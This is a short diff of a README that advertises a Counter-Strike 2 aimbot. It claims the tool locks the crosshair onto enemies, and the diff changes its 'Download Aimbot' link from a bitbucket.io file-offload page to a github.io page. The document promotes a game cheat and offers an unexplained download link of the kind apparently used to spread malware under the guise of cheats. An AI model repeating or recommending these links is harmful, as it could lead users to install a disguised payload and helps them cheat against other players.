@@ -4,7 +4,7 @@
 
 An aimbot is a tool that enhances your aiming capabilities in Counter-Strike 2. It automatically aligns your crosshair with enemy targets, ensuring precise shots every time.
 
-[![Download Aimbot](https://img.shields.io/badge/Download-aimbot-blueviolet)](https://fileoffload2.bitbucket.io/)
+[![Download Aimbot](https://img.shields.io/badge/Download-aimbot-blueviolet)](https://CS2-Aimbot-koq.github.io/.github)
 ---
 
 ### 🔧 Key Features of CS2 Aimbots
